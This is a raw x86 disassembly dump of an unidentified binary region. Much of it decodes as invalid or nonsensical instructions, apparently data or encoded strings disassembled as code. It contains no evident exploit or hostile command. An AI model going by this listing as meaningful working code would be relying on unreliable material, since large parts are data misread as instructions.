  421a46:	aaa    
  421a47:	gs xchg edx,eax
  421a49:	push   es
  421a4a:	(bad)  
  421a4b:	ss pop edi
  421a4d:	sbb    ebx,DWORD PTR [ecx]
	...
  421a5f:	nop
  421a60:	inc    edx
  421a61:	add    BYTE PTR [eax+edx*4],al
  421a64:	inc    edx
  421a65:	add    BYTE PTR [eax],cl
  421a67:	nop
  421a68:	inc    edx
  421a69:	add    BYTE PTR [eax+edx*4],cl
  421a6c:	inc    edx
  421a6d:	add    BYTE PTR [eax],dl
  421a6f:	nop
  421a70:	inc    edx
  421a71:	add    BYTE PTR [eax+edx*4],dl
  421a74:	inc    edx
  421a75:	add    BYTE PTR [eax],bl
  421a77:	nop
  421a78:	inc    edx
  421a79:	add    BYTE PTR [eax+edx*4],bl
  421a7c:	inc    edx
  421a7d:	add    BYTE PTR [eax],al
  421a7f:	mov    al,ds:0xa0040042
  421a84:	inc    edx
  421a85:	add    BYTE PTR [eax],cl
  421a87:	mov    al,ds:0xa00c0042
  421a8c:	inc    edx
  421a8d:	add    BYTE PTR [eax],dl
  421a8f:	mov    al,ds:0xa0140042
  421a94:	inc    edx
  421a95:	add    BYTE PTR [eax],bl
  421a97:	mov    al,ds:0xa01c0042
  421a9c:	inc    edx
  421a9d:	add    BYTE PTR [eax],al
  421a9f:	mov    al,0x42
  421aa1:	add    BYTE PTR [eax+esi*4],al
  421aa4:	inc    edx
  421aa5:	add    BYTE PTR [eax],cl
  421aa7:	mov    al,0x42
  421aa9:	add    BYTE PTR [eax+esi*4],cl
  421aac:	inc    edx
  421aad:	add    BYTE PTR [eax],dl
  421aaf:	mov    al,0x42
  421ab1:	add    BYTE PTR [eax+esi*4],dl
  421ab4:	inc    edx
  421ab5:	add    BYTE PTR [eax],bl
  421ab7:	mov    al,0x42
  421ab9:	add    BYTE PTR [eax+esi*4],bl
  421abc:	inc    edx
  421abd:	add    BYTE PTR [eax+0x66],bh
  421ac0:	ins    BYTE PTR es:[edi],dx
  421ac1:	jp     0x421b1a
  421ac3:	jbe    0x421b0c
  421ac5:	ja     0x421b0a
  421ac7:	js     0x421b11
  421ac9:	jno    0x421b2e
  421acb:	inc    edx
  421acc:	inc    bx
  421ace:	push   ebp
  421acf:	jno    0x421b47
  421ad1:	ja     0x421b3a
  421ad3:	dec    edi
  421ad4:	dec    esp
  421ad5:	dec    ebp
  421ad6:	inc    edx
  421ad7:	jno    0x421b4a
  421ad9:	jae    0x421b2e
  421adb:	push   eax
  421adc:	arpl   WORD PTR [ebx-0x7a],dx
  421adf:	push   ds
  421ae0:	inc    edx
  421ae1:	add    BYTE PTR [esi+0x2600421e],cl
  421ae7:	sbb    eax,0xbef0042
  421aec:	mov    dl,0xe
  421aee:	jns    0x421b3e
  421af0:	xor    BYTE PTR [esi-0x79],cl
  421af3:	dec    edi
  421af4:	cmp    eax,0x3e4faf4e
  421af9:	dec    esi
  421afa:	js     0x421b4a
  421afc:	cmp    ecx,DWORD PTR [esi-0x64]
  421aff:	dec    edi
  421b00:	inc    esp
  421b01:	dec    esi
  421b02:	jae    0x421b52
  421b04:	inc    ecx
  421b05:	dec    esi
  421b06:	xor    BYTE PTR [esi+0x40],cl
  421b09:	dec    esi
  421b0a:	pop    esp
  421b0b:	pop    ebp
  421b0c:	pop    edi
  421b0d:	push   edx
  421b0e:	cmp    DWORD PTR [esi+0x79],ecx
  421b11:	dec    esi
  421b12:	xor    BYTE PTR [esi-0x79],cl
  421b15:	dec    edi
  421b16:	cmp    eax,0x3e4faf4e
  421b1b:	dec    esi
  421b1c:	js     0x421b6c
  421b1e:	cmp    ecx,DWORD PTR [esi-0x64]
  421b21:	dec    edi
  421b22:	inc    esp
  421b23:	dec    esi
  421b24:	mov    DWORD PTR [edi+0x41],ecx
  421b27:	dec    esi
  421b28:	xor    BYTE PTR [esi+0x40],cl
  421b2b:	dec    esi
  421b2c:	pop    esp
  421b2d:	ins    DWORD PTR es:[edi],dx
  421b2e:	pop    edi
  421b2f:	bound  edi,QWORD PTR [ecx]
  421b31:	dec    esi
  421b32:	jns    0x421b82
  421b34:	xor    BYTE PTR [esi-0x80],cl
  421b37:	dec    edi
  421b38:	cmp    eax,0x394e734e
  421b3d:	dec    esi
  421b3e:	mov    ds:0x304e3a4f,al
  421b43:	dec    esi
  421b44:	inc    esi
  421b45:	dec    esi
  421b46:	pop    esp
  421b47:	jge    0x421ba8
  421b49:	jb     0x421bba
  421b4b:	sub    BYTE PTR [esi-0x7d],0x7e
  421b4f:	xchg   ebx,eax
  421b50:	jns    0x421ae2
  421b52:	aas    
  421b53:	dec    esi
  421b54:	test   BYTE PTR [edi+0x30],cl
  421b57:	dec    esi
  421b58:	test   BYTE PTR [edi+0x3c],cl
  421b5b:	dec    esi
  421b5c:	mov    ds:0x734e394f,al
  421b61:	dec    esi
  421b62:	inc    ebp
  421b63:	dec    esi
  421b64:	xor    BYTE PTR [esi+0x44],cl
  421b67:	dec    esi
  421b68:	pop    esp
  421b69:	lea    ebx,[edi-0x7e]
  421b6c:	outs   dx,DWORD PTR ds:[esi]
  421b6d:	xchg   edx,eax
  421b6e:	outs   dx,BYTE PTR ds:[esi]
  421b6f:	xchg   ebx,eax
  421b70:	jle    0x421b15
  421b72:	jns    0x421b14
  421b74:	aas    
  421b75:	dec    esi
  421b76:	test   BYTE PTR [edi+0x30],cl
  421b79:	dec    esi
  421b7a:	test   BYTE PTR [edi+0x3c],cl
  421b7d:	dec    esi
  421b7e:	mov    ds:0x894e394f,al
  421b83:	dec    edi
  421b84:	inc    ebp
  421b85:	dec    esi
  421b86:	xor    BYTE PTR [esi+0x44],cl
  421b89:	dec    esi
  421b8a:	pop    esp
  421b8b:	popf   
  421b8c:	pop    edi
  421b8d:	xchg   edx,eax
  421b8e:	outs   dx,DWORD PTR ds:[esi]
  421b8f:	mov    ds:0xb37ea36e,al
  421b94:	jns    0x421b46
  421b96:	aas    
  421b97:	dec    esi
  421b98:	mov    cs,WORD PTR [edi+0x30]
  421b9b:	dec    esi
  421b9c:	lods   al,BYTE PTR ds:[esi]
  421b9d:	dec    edi
  421b9e:	cmp    eax,0x394e734e
  421ba3:	dec    esi
  421ba4:	mov    eax,ds:0x304e3a4f
  421ba9:	dec    esi
  421baa:	inc    esp
  421bab:	dec    esi
  421bac:	pop    esp
  421bad:	lods   eax,DWORD PTR ds:[esi]
  421bae:	pop    edi
  421baf:	mov    ds:0xb36eb26f,al
  421bb4:	jle    0x421b79
  421bb6:	jns    0x421b78
  421bb8:	aas    
  421bb9:	dec    esi
  421bba:	mov    cs,WORD PTR [edi+0x30]
  421bbd:	dec    esi
  421bbe:	lods   al,BYTE PTR ds:[esi]
  421bbf:	dec    edi
  421bc0:	cmp    eax,0x394e7e4e
  421bc5:	dec    esi
  421bc6:	lahf   
  421bc7:	dec    edi
  421bc8:	cmp    ecx,DWORD PTR [esi+0x30]
  421bcb:	dec    esi
  421bcc:	inc    ebp
  421bcd:	dec    esi
  421bce:	pop    esp
  421bcf:	mov    ebp,0xc26fb25f
  421bd4:	outs   dx,BYTE PTR ds:[esi]
  421bd5:	ret    
  421bd6:	jle    0x421bab
  421bd8:	jns    0x421baa
  421bda:	aas    
  421bdb:	dec    esi
  421bdc:	mov    cs,WORD PTR [edi+0x30]
  421bdf:	dec    esi
  421be0:	lods   al,BYTE PTR ds:[esi]
  421be1:	dec    edi
  421be2:	cmp    eax,0x394f804e
  421be7:	dec    esi
  421be8:	lods   al,BYTE PTR ds:[esi]
  421be9:	dec    edi
  421bea:	cmp    cl,BYTE PTR [esi+0x30]
  421bed:	dec    esi
  421bee:	inc    esi
  421bef:	dec    esi
  421bf0:	pop    esp
  421bf1:	int    0x5f
  421bf3:	ret    0xd26f
  421bf6:	outs   dx,BYTE PTR ds:[esi]
  421bf7:	sar    DWORD PTR [esi-0x1d],cl
  421bfa:	jns    0x421bdc
  421bfc:	aas    
  421bfd:	dec    esi
  421bfe:	mov    cs,WORD PTR [edi+0x30]
  421c01:	dec    esi
  421c02:	lods   al,BYTE PTR ds:[esi]
  421c03:	dec    edi
  421c04:	cmp    eax,0x394f834e
  421c09:	dec    esi
  421c0a:	mov    ds:0x304e3a4f,al
  421c0f:	dec    esi
  421c10:	inc    esp
  421c11:	dec    esi
  421c12:	pop    esp
  421c13:	fstp   QWORD PTR [edi-0x2e]
  421c16:	outs   dx,DWORD PTR ds:[esi]
  421c17:	loop   0x421c87
  421c19:	jecxz  0x421c99
  421c1b:	repz jns 0x421c0e
  421c1e:	aas    
  421c1f:	dec    esi
  421c20:	lea    ecx,[edi+0x30]
  421c23:	dec    esi
  421c24:	lahf   
  421c25:	dec    edi
  421c26:	cmp    eax,0x3c4fa04e
  421c2b:	dec    esi
  421c2c:	xor    BYTE PTR [esi+0x3f],cl
  421c2f:	dec    esi
  421c30:	pop    esp
  421c31:	in     eax,dx
  421c32:	pop    edi
  421c33:	loop   0x421ca4
  421c35:	repnz outs dx,BYTE PTR ds:[esi]
  421c37:	repz jle 0x421c3d
  421c3a:	jns    0x421c3c
  421c3c:	jle    0x421c51
  421c3e:	jns    0x421c50
  421c40:	cmp    al,0x4e
  421c42:	jg     0x421c92
  421c44:	xor    BYTE PTR [esi-0x65],cl
  421c47:	dec    edi
  421c48:	xor    cl,BYTE PTR [esi-0x80]
  421c4b:	dec    edi
  421c4c:	cmp    al,0x4e
  421c4e:	lods   eax,DWORD PTR ds:[esi]
  421c4f:	dec    edi
  421c50:	cmp    ecx,DWORD PTR [esi+0x30]
  421c53:	dec    esi
  421c54:	inc    ebp
  421c55:	dec    esi
  421c56:	pop    esp
  421c57:	or     eax,0x126f025f
  421c5c:	outs   dx,BYTE PTR ds:[esi]
  421c5d:	adc    edi,DWORD PTR [esi+0x23]
  421c60:	jns    0x421c82
  421c62:	aas    
  421c63:	dec    esi
  421c64:	add    BYTE PTR [eax],al
  421c66:	out    dx,al
  421c67:	sbb    al,BYTE PTR [edx+0x0]
  421c6a:	loop   0x421c88
  421c6c:	inc    edx
  421c6d:	add    dl,ch
  421c6f:	sbb    al,0x42
  421c71:	add    BYTE PTR [edx-0x1ffbde2],dl
  421c77:	sbb    eax,0x1e820042
  421c7c:	inc    edx
  421c7d:	add    dl,cl
  421c7f:	sbb    al,0x42
  421c81:	add    dh,cl
  421c83:	sbb    al,0x42
  421c85:	add    BYTE PTR [esi+0x1e],bh
  421c88:	inc    edx
  421c89:	add    BYTE PTR [edx],dh
  421c8b:	sbb    eax,0xa90d0042
  421c90:	pushf  
  421c91:	clc    
  421c92:	ss mov edx,0x1ce6f89c
  421c98:	inc    edx
  421c99:	add    BYTE PTR [esi-0x35ffbde3],dh
  421c9f:	sbb    eax,0x1dd60042
  421ca4:	inc    edx
  421ca5:	add    dh,ah
  421ca7:	sbb    eax,0x1d1e0042
  421cac:	inc    edx
  421cad:	add    dl,ch
  421caf:	sbb    al,BYTE PTR [edx+0x0]
  421cb2:	ds sbb eax,0x1d2e0042
  421cb8:	inc    edx
  421cb9:	add    BYTE PTR [esi-0x49ffbde2],dl
  421cbf:	test   DWORD PTR [eax+edi*8-0x7ee8f4e7],ebx
  421cc6:	repnz sbb al,0x42
  421cc9:	add    BYTE PTR [esp+ebx*1],dl
  421ccc:	push   ss
  421ccd:	or     DWORD PTR [eax],0x7050d
  421cd3:	add    BYTE PTR [eax+0x0],al
  421cd6:	cmp    al,BYTE PTR [edx+0x3e]
  421cd9:	ds enter 0x4279,0x0
  421cde:	ins    DWORD PTR es:[edi],dx
  421cdf:	push   ebp
  421ce0:	inc    esp
  421ce1:	imul   ecx,DWORD PTR [eax],0x86275fa
  421ce7:	in     eax,dx
  421ce8:	inc    BYTE PTR [edi]
  421cea:	aas    
  421ceb:	cli    
  421cec:	mov    ds:0x421cda05,eax
  421cf1:	add    BYTE PTR [ebp-0x4a07636b],dh
  421cf7:	xchg   esi,eax
  421cf8:	pushf  
  421cf9:	clc    
  421cfa:	mov    ah,0x95
  421cfc:	pushf  
  421cfd:	clc    
  421cfe:	mov    ebx,0xbaf89c95
  421d03:	xchg   ebp,eax
  421d04:	pushf  
  421d05:	clc    
  421d06:	mov    ecx,0xb8f89c95
  421d0b:	xchg   ebp,eax
  421d0c:	pushf  
  421d0d:	clc    
  421d0e:	mov    edi,0xbef89c95
  421d13:	xchg   ebp,eax
  421d14:	pushf  
  421d15:	clc    
  421d16:	mov    ebp,0xa6f89c95
  421d1b:	xchg   ebp,eax
  421d1c:	pushf  
  421d1d:	clc    
  421d1e:	jmp    0x421a:0xe26003f9
  421d25:	add    BYTE PTR [eax+eax*2+0x42],ch
  421d29:	add    BYTE PTR [ebx+0x77],dl
  421d2c:	jbe    0x421d7e
  421d2e:	mov    dh,0x85
  421d30:	pushf  
  421d31:	clc    
  421d32:	sbb    ecx,ebp
  421d34:	push   eax
  421d35:	pop    es
  421d36:	sbb    BYTE PTR [ebx],cl
  421d38:	add    BYTE PTR [eax],al
  421d3a:	ficomp WORD PTR [edx]
  421d3c:	inc    edx
  421d3d:	add    BYTE PTR [ebx],bl
  421d3f:	or     eax,DWORD PTR [esi+ecx*1]
	...
  421d72:	ins    BYTE PTR es:[edi],dx
  421d73:	inc    eax
  421d74:	inc    edx
  421d75:	add    BYTE PTR [esi+0x66f89c85],dh
  421d7b:	add    BYTE PTR [edx+0x0],ch
  421d7e:	add    BYTE PTR [si+0x0],ah
  421d82:	push   0x64006700
  421d87:	add    BYTE PTR [esi+0x0],ah
  421d8a:	push   0x0
  421d8c:	push   0x66006400
  421d91:	add    BYTE PTR [edi+0x0],ah
  421d94:	push   0x0
  421d96:	push   0x66006700
  421d9b:	add    BYTE PTR [eax+0x0],ch
  421d9e:	add    BYTE PTR [bp+0x0],ah
  421da2:	push   0x66006700
	...
  421daf:	add    BYTE PTR [eax],al
  421db1:	add    BYTE PTR [ecx-0x5affbfa4],cl
  421db7:	dec    edi
  421db8:	lahf   
  421db9:	dec    edi
  421dba:	mov    ds:0x9f4fa64f,al
  421dbf:	dec    edi
  421dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421dc1:	dec    edi
  421dc2:	ins    DWORD PTR es:[edi],dx
  421dc3:	dec    esi
  421dc4:	bound  ecx,QWORD PTR [esi+0x30]
  421dc7:	dec    esi
  421dc8:	add    BYTE PTR [eax],al
  421dca:	cdq    
  421dcb:	dec    edi
  421dcc:	pushf  
  421dcd:	dec    edi
  421dce:	fwait
  421dcf:	dec    edi
  421dd0:	ins    DWORD PTR es:[edi],dx
  421dd1:	dec    esi
  421dd2:	bound  ecx,QWORD PTR [esi+0x30]
  421dd5:	dec    esi
  421dd6:	scas   eax,DWORD PTR es:[edi]
  421dd7:	dec    edi
  421dd8:	lods   eax,DWORD PTR ds:[esi]
  421dd9:	dec    edi
  421dda:	lahf   
  421ddb:	dec    edi
  421ddc:	mov    ds:0x624e6d4f,al
  421de1:	dec    esi
  421de2:	xor    BYTE PTR [esi+0x0],cl
  421de5:	add    BYTE PTR [ebp-0x5bb067b1],ch
  421deb:	dec    edi
  421dec:	test   eax,0xa04f934f
  421df1:	dec    edi
  421df2:	fwait
  421df3:	dec    edi
  421df4:	xor    BYTE PTR [esi+0x0],cl
  421df7:	add    BYTE PTR [eax],al
  421df9:	add    BYTE PTR [eax],al
  421dfb:	add    BYTE PTR [eax],al
  421dfd:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  421e04:	mov    WORD PTR [ebp-0x32734274],gs
  421e0a:	mov    ebp,ds
  421e0c:	mov    ebp,gs
  421e0e:	mov    ebp,?
  421e10:	mov    WORD PTR ds:0x2d8c1d8c,cs
  421e16:	mov    WORD PTR ds:0x6d8c5d8c,?
  421e1c:	mov    WORD PTR [edx-0x74],?
  421e1f:	jae    0x421dad
  421e21:	jo     0x421daf
  421e23:	jno    0x421db1
  421e25:	jbe    0x421db3
  421e27:	ja     0x421db5
  421e29:	je     0x421db7
  421e2b:	jne    0x421db9
  421e2d:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  421e34:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  421e3a:	lods   al,BYTE PTR ds:[esi]
  421e3b:	jge    0x421df9
  421e3d:	jge    0x421ddd
  421e3f:	(bad)  
  421e40:	jns    0x421eb5
  421e42:	mov    ecx,0x7d738cb1
  421e47:	ins    DWORD PTR es:[edi],dx
  421e48:	enter  0x9fc6,0x26
  421e4c:	jb     0x421e51
  421e4e:	test   eax,0xb956bb17
  421e53:	hlt    
  421e54:	test   al,0x37
  421e56:	test   al,0x7e
  421e58:	fnstenv [ecx-0x6a]
  421e5b:	mov    cl,0x6a
  421e5d:	push   0xffffffce
  421e5f:	or     BYTE PTR [edx],bl
  421e61:	xlat   BYTE PTR ds:[ebx]
  421e62:	out    dx,eax
  421e63:	add    eax,0x9321d7aa
  421e68:	scas   al,BYTE PTR es:[edi]
  421e69:	adc    DWORD PTR [esi],esp
  421e6b:	jge    0x421e90
  421e6d:	fidiv  WORD PTR [edi]
  421e6f:	leave  
  421e70:	hlt    
  421e71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e72:	cmp    ax,0x1fc8
  421e76:	mov    dh,cl
  421e78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e79:	(bad)  
  421e7a:	and    DWORD PTR [eax],ebx
  421e7c:	and    DWORD PTR [ecx-0x18],esi
  421e7f:	(bad)  [ebx+0x7]
  421e82:	cmc    
  421e83:	enter  0x301a,0x14
  421e87:	inc    eax
  421e88:	inc    edx
  421e89:	add    BYTE PTR [ecx+0x66],dh
  421e8c:	jp     0x421efc
  421e8e:	rcr    BYTE PTR [edx+eax*2],cl
  421e91:	add    BYTE PTR [esi],dh
  421e93:	sbb    eax,0xed080042
  421e98:	adc    al,BYTE PTR [edi]
  421e9a:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  421ea1:	ins    BYTE PTR es:[edi],dx
  421ea2:	push   0x49657557
  421ea7:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  421ead:	push   edi
  421eae:	jp     0x421f2a
  421eb0:	dec    ebp
  421eb1:	push   esi
  421eb2:	arpl   WORD PTR gs:[ecx+0x45],si
  421eb6:	dec    edx
  421eb7:	dec    esi
  421eb8:	data16 ja 0x421f09
  421ebb:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
	...
  421ed6:	inc    ebp
  421ed7:	push   edx
  421ed8:	jb     0x421f4e
  421eda:	inc    esi
  421edb:	je     0x421f1e
  421edd:	inc    esi
  421ede:	jae    0x421f56
  421ee0:	dec    ebx
  421ee1:	gs dec ecx
  421ee3:	dec    ebp
  421ee4:	dec    ebp
  421ee5:	pop    edx
  421ee6:	jp     0x421f42
  421ee8:	jbe    0x421f30
  421eea:	pop    ecx
  421eeb:	jo     0x421f65
  421eed:	inc    edi
  421eee:	gs ins BYTE PTR es:[edi],dx
  421ef0:	dec    esp
  421ef1:	js     0x421f5b
  421ef3:	inc    edx
  421ef4:	js     0x421f3c
  421ef6:	dec    eax
  421ef7:	inc    ebp
  421ef8:	inc    esp
  421ef9:	inc    esp
  421efa:	push   ecx
  421efb:	dec    edx
  421efc:	ins    BYTE PTR es:[edi],dx
  421efd:	dec    ebx
  421efe:	jbe    0x421f6e
  421f00:	pop    eax
  421f01:	jbe    0x421f4e
  421f03:	inc    ecx
  421f04:	fs gs jno 0x421f75
  421f08:	push   ebx
  421f09:	inc    ecx
  421f0a:	add    BYTE PTR [eax],al
  421f0c:	inc    ebx
  421f0d:	outs   dx,BYTE PTR ds:[esi]
  421f0e:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  421f12:	push   edx
  421f13:	push   ecx
  421f14:	push   0x74000064
  421f19:	jne    0x421f90
  421f1b:	ins    DWORD PTR es:[edi],dx
  421f1c:	push   ecx
  421f1d:	push   eax
  421f1e:	jo     0x421f9a
  421f20:	addr16 jo 0x421f79
  421f23:	pop    eax
  421f24:	add    BYTE PTR [eax],al
  421f26:	push   ecx
  421f27:	pop    ecx
  421f28:	inc    ebx
  421f29:	inc    edx
  421f2a:	outs   dx,BYTE PTR ds:[esi]
  421f2b:	popa   
  421f2c:	imul   eax,DWORD PTR [edx+0x61],0x6b
  421f30:	jne    0x421fa0
  421f32:	dec    ebx
  421f33:	je     0x421f98
  421f35:	bound  esp,QWORD PTR [edi+0x0]
  421f38:	jns    0x421f7f
  421f3a:	bound  ebp,QWORD PTR [ecx+0x46]
  421f3d:	dec    ecx
  421f3e:	ja     0x421f85
  421f40:	dec    eax
  421f41:	inc    ebp
  421f42:	inc    edx
  421f43:	push   ebx
  421f44:	add    BYTE PTR [eax],al
  421f46:	outs   dx,DWORD PTR ds:[esi]
  421f47:	inc    edi
  421f48:	dec    esi
  421f49:	outs   dx,DWORD PTR ds:[esi]
  421f4a:	pop    ecx
  421f4b:	inc    edi
  421f4c:	jb     0x421f95
  421f4e:	jns    0x421fc6
  421f50:	inc    ecx
  421f51:	pop    eax
  421f52:	dec    esp
  421f53:	add    BYTE PTR [eax+0x48],bh
  421f56:	bound  edx,QWORD PTR [ebx+0x43]
  421f59:	pop    eax
  421f5a:	outs   dx,DWORD PTR ds:[esi]
  421f5b:	push   0x4355
  421f60:	dec    esp
  421f61:	ins    BYTE PTR es:[edi],dx
  421f62:	inc    edx
  421f63:	push   0x76666a73
  421f68:	inc    edx
  421f69:	jo     0x421f6b
  421f6b:	add    BYTE PTR [eax],al
  421f6d:	add    BYTE PTR [edi+0x6d],ah
  421f70:	je     0x421fb9
  421f72:	ins    BYTE PTR es:[edi],dx
  421f73:	jae    0x421fdf
  421f75:	inc    esi
  421f76:	ins    DWORD PTR es:[edi],dx
  421f77:	je     0x421fcf
  421f79:	push   0x56584178
  421f7e:	push   ebx
  421f7f:	addr16 dec edx
  421f81:	jo     0x421ff5
  421f83:	js     0x421ff4
  421f85:	pop    eax
  421f86:	dec    ebx
  421f87:	push   esp
  421f88:	dec    esp
  421f89:	jns    0x421fd6
  421f8b:	js     0x422005
  421f8d:	outs   dx,BYTE PTR ds:[esi]
  421f8e:	pop    ecx
  421f8f:	jae    0x421fff
  421f91:	push   0x43644448
  421f96:	arpl   WORD PTR [edx+0x55],sp
  421f99:	push   0x42504e67
  421f9e:	push   ebp
  421f9f:	je     0x422016
  421fa1:	addr16 dec edi
  421fa3:	dec    esp
  421fa4:	inc    edx
  421fa5:	ins    DWORD PTR es:[edi],dx
  421fa6:	inc    esi
  421fa7:	inc    esi
  421fa8:	inc    esi
  421fa9:	arpl   WORD PTR [edx+0x47],bx
  421fac:	push   ebp
  421fad:	inc    ebx
  421fae:	popa   
  421faf:	push   edx
  421fb0:	dec    esp
  421fb1:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  421fb8:	push   ecx
  421fb9:	push   ebx
  421fba:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  421fc1:	dec    edx
  421fc2:	jns    0x42202d
  421fc4:	push   edx
  421fc5:	inc    ebx
  421fc6:	jo     0x42203d
  421fc8:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  421fcc:	fs push ebx
  421fce:	inc    ebx
  421fcf:	push   ebp
  421fd0:	push   eax
  421fd1:	ja     0x42200e
  421fd3:	fisttp QWORD PTR [ebp+ebp*4-0x12]
  421fd7:	mov    ebp,0xa53ddffb
  421fdc:	js     0x421f97
  421fde:	outs   dx,DWORD PTR ds:[esi]
  421fdf:	adc    edi,ecx
  421fe1:	or     bl,BYTE PTR [edx-0x2a]
  421fe4:	add    DWORD PTR [eax],eax
  421fe6:	pop    ebx
  421fe7:	add    BYTE PTR [eax],al
  421fe9:	add    BYTE PTR [edx+eax*8],bh
  421fec:	and    esp,DWORD PTR [ecx]
  421fee:	push   es
  421fef:	fdiv   QWORD PTR [esi]
  421ff1:	data16 jl 0x421fdf
  421ff4:	ins    BYTE PTR es:[edi],dx
  421ff5:	jle    0x42201a
  421ff7:	adc    esp,DWORD PTR [ebx]
  421ff9:	and    edi,DWORD PTR [eax-0x32]
  421ffc:	fld    TBYTE PTR [ecx-0x9]
  421fff:	cmc    
  422000:	test   eax,0x81183f4f
  422005:	das    
  422006:	lods   eax,DWORD PTR ds:[esi]
  422007:	mov    al,0xd5
  422009:	dec    ecx
  42200a:	dec    esi
  42200b:	xchg   ebp,eax
  42200c:	call   DWORD PTR [edx+ecx*8+0x26f9bbd3]
  422013:	pop    esp
  422014:	fidiv  WORD PTR [edi]
  422016:	xor    BYTE PTR [edi+0x2e],dh
  422019:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42201a:	pop    eax
  42201b:	jg     0x421fd8
  42201d:	popa   
  42201e:	ins    BYTE PTR es:[edi],dx
  42201f:	xchg   esp,eax
  422020:	ss (bad) 
  422022:	aad    0x48
  422024:	popf   
  422025:	mov    ebx,0x9c41354c
  42202a:	mov    ds:0xfc4b10ba,al
  42202f:	sbb    edi,eax
  422031:	push   eax
  422032:	or     DWORD PTR [ebp+0x5d7b9719],ecx
  422038:	lahf   
  422039:	sub    eax,0x1f849821
  42203e:	inc    ebp
  42203f:	iret   
  422040:	push   ebx
  422041:	and    bh,BYTE PTR [ebx+0x70]
  422044:	xchg   DWORD PTR [eax],eax
	...
  422052:	sub    BYTE PTR [edx+0x57bf52a5],dh
  422058:	(bad)  
  422059:	cli    
  42205a:	jl     0x4220c0
  42205c:	xlat   BYTE PTR ds:[ebx]
  42205d:	push   esi
  42205e:	sub    ebx,DWORD PTR [ebx]
  422060:	jle    0x422052
  422062:	mov    ch,0xd6
  422064:	add    DWORD PTR [eax],eax
  422066:	pop    ebx
  422067:	add    BYTE PTR [eax],al
  422069:	add    cl,dl
  42206b:	lods   al,BYTE PTR ds:[esi]
  42206c:	inc    DWORD PTR [edx]
  42206e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42206f:	iretw  
  422071:	sbb    eax,0xb14af97d
  422076:	inc    esi
  422077:	dec    eax
  422078:	sbb    eax,0x47454a06
  42207d:	in     eax,dx
  42207e:	sbb    eax,0x1bd158c1
  422083:	xchg   ebp,eax
  422084:	mov    eax,ds:0xb1fed610
  422089:	lods   eax,DWORD PTR ds:[esi]
  42208a:	jmp    0xf50a:0x34d05eaa
  422091:	leave  
  422092:	repz mov ecx,0xa13950a5
  422098:	fadd   DWORD PTR [ecx+0x6a900c9f]
  42209e:	popf   
  42209f:	loope  0x422040
  4220a1:	and    al,BYTE PTR [edx+0x42]
  4220a4:	cmp    DWORD PTR [edi-0x39419486],ecx
  4220aa:	repnz stos DWORD PTR es:[edi],eax
  4220ac:	jge    0x4220ee
  4220ae:	xor    bh,BYTE PTR [ecx+0x2d6bdbae]
  4220b4:	pushf  
  4220b5:	push   edx
  4220b6:	xchg   ebp,eax
  4220b7:	test   al,0xf8
  4220b9:	leave  
  4220ba:	jge    0x4220fe
  4220bc:	stc    
  4220bd:	in     eax,dx
  4220be:	in     eax,0x4c
  4220c0:	fldenv [edi+0x8892a0]
	...
  4220d2:	mov    bl,0x55
  4220d4:	jg     0x422057
  4220d6:	jmp    FWORD PTR [ebx-0x69418801]
  4220dc:	push   0xce8fc857
  4220e1:	jp     0x4220f3
  4220e3:	xlat   BYTE PTR ds:[ebx]
  4220e4:	add    DWORD PTR [eax],eax
  4220e6:	pop    ebx
  4220e7:	add    BYTE PTR [eax],al
  4220e9:	add    BYTE PTR [edi+eax*4+0xd924ef7],dh
  4220f0:	lods   al,BYTE PTR ds:[esi]
  4220f1:	mov    bh,0x84
  4220f3:	dec    edi
  4220f4:	rcr    DWORD PTR [esi],0x4a
  4220f7:	push   edx
  4220f8:	jl     0x42212a
  4220fa:	or     DWORD PTR [eax-0x6dbfab7],edi
  422100:	scas   eax,DWORD PTR es:[edi]
  422101:	or     dl,ah
  422103:	jge    0x4220f8
  422105:	or     eax,0x2533b141
  42210a:	xor    BYTE PTR [ebp-0xc],dh
  42210d:	jbe    0x422097
  42210f:	mov    ecx,0x841ce4a
  422114:	cli    
  422115:	js     0x42216c
  422117:	mov    al,0xd6
  422119:	(bad)  
  42211a:	out    dx,eax
  42211b:	inc    edx
  42211c:	adc    ch,BYTE PTR [ecx+0x2621dc25]
  422122:	pop    es
  422123:	sub    dl,BYTE PTR [edx+0x30]
  422126:	int    0x59
  422128:	mov    esp,0xab2cf708
  42212d:	cmp    edi,eax
  42212f:	fnsave [esi]
  422131:	pushf  
  422132:	mov    bl,BYTE PTR [edx+0x1ce721b0]
  422138:	in     al,dx
  422139:	mov    DWORD PTR [ecx],eax
  42213b:	in     eax,0x4f
  42213d:	stos   DWORD PTR es:[edi],eax
  42213e:	add    edi,DWORD PTR [esp+edi*8-0x6a6e16ee]
	...
  422151:	add    BYTE PTR [eax],bh
  422153:	(bad)  
  422154:	cmp    ah,BYTE PTR [esi+edi*8]
  422157:	in     al,dx
  422158:	fimul  WORD PTR ds:[edi-0x1c53942b]
  42215f:	push   edi
  422160:	out    0x27,al
  422162:	imul   edx,edi,0x1
  422165:	add    BYTE PTR [ebx+0x0],bl
  422168:	add    BYTE PTR [eax],al
  42216a:	add    esp,esp
  42216c:	aam    0x62
  42216e:	sub    esp,DWORD PTR [eax+0x7a1e27a3]
  422174:	int3   
  422175:	out    dx,al
  422176:	sub    bl,BYTE PTR [ebx+0x2db4fd26]
  42217c:	mov    DWORD PTR [edi-0x5],ecx
  42217f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422180:	and    BYTE PTR [ebp-0x2c],ah
  422183:	adc    al,BYTE PTR [ecx-0x2c4d10f5]
  422189:	(bad)  
  42218a:	hlt    
  42218b:	dec    esi
  42218c:	(bad)  
  42218d:	in     al,dx
  42218e:	cmovg  eax,DWORD PTR [ebp-0x51c30f80]
  422195:	retf   
